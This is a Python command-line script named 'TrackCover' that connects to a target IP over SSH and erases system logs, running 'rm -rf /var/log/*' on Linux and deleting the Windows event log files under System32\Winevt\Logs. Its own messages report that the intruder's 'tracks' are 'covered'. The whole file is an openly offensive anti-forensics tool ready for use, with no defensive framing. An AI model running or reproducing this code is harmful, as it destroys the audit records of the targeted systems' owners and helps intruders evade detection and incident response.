import subprocess
import logging
import argparse
import sys

# Configure logging
logger = logging.getLogger('TrackCover')
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class TrackCover:
    def __init__(self):
        # Initialization if needed
        pass

    def erase_logs(self, target_ip: str, system_type: str):
        # Enhanced log cleaning logic to handle different system types
        try:
            if system_type == 'linux':
                # Commands for Linux log cleaning
                clean_logs_command = [
                    'ssh', target_ip, 'logrotate -f /etc/logrotate.conf && rm -rf /var/log/*'
                ]
            elif system_type == 'windows':
                # Windows does not have a direct equivalent to 'logrotate'
                # This is a placeholder for Windows log cleaning
                clean_logs_command = [
                    'ssh', target_ip, 'del /q /f /s %SystemRoot%\System32\Winevt\Logs\*'
                ]
            else:
                raise ValueError('Unsupported system type')

            # Using subprocess.run instead of check_output for better error handling
            result = subprocess.run(clean_logs_command, shell=False, capture_output=True, text=True)
            
            if result.returncode == 0:
                logger.info(f"Logs cleaned successfully for {target_ip}")
                return True
            else:
                logger.error(f"Log cleaning failed for {target_ip}: {result.stderr}")
                return False

        except subprocess.CalledProcessError as e:
            logger.error(f"Log cleaning failed for {target_ip}: {e.stderr}")
            return False
        except ValueError as e:
            logger.error(f"Error: {e}")
            return False
        except Exception as e:
            logger.error(f"An unexpected error occurred during log cleaning: {e}")
            return False

# Command-line argument parsing for versatility
def main():
    parser = argparse.ArgumentParser(description='Track Cover Log Eraser')
    parser.add_argument('target_ip', help='The target IP address where logs should be erased')
    parser.add_argument('system_type', help='The type of system (e.g., linux, windows)', choices=['linux', 'windows'])
    args = parser.parse_args()

    cover = TrackCover()
    if cover.erase_logs(args.target_ip, args.system_type):
        logger.info(f"Tracks covered for {args.target_ip}")
    else:
        logger.error(f"Failed to cover tracks for {args.target_ip}")

if __name__ == "__main__":
    main()
